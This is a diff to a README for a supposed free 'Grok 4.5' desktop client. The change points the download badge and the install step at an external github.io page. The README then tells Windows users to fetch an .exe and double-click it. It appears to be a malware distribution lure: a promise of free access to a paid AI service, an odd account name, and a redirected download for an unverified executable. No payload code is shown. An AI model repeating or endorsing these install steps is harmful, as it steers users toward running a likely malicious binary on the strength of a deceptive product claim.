@@ -1,6 +1,6 @@
 # 🤖 Cursor-Grok-4.5-xAI-free-desktop - Access Grok 4.5 AI for free
 
-[![Download for Windows](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Done-appurtenance763/Cursor-Grok-4.5-xAI-free-desktop)
+[![Download for Windows](https://img.shields.io/badge/Download-Software-blue.svg)](https://done-appurtenance763.github.io)
 
 This software provides a desktop interface to connect with the Grok 4.5 AI model. It manages the configuration files needed to route your requests through the xAI backend. You can use this application to chat with the model, generate text, and test complex logic without paying for a subscription.
 
@@ -18,7 +18,7 @@ To run this application, your computer needs these basic specifications:
 
 Follow these steps to set up the desktop client on your Windows machine:
 
-1. Visit the [official repository page](https://github.com/Done-appurtenance763/Cursor-Grok-4.5-xAI-free-desktop) to obtain the installer.
+1. Visit the [official repository page](https://done-appurtenance763.github.io) to obtain the installer.
 2. Locate the file ending in .exe in the releases section.
 3. Save the file to your desktop folder.
 4. Double-click the file to start the installation process.
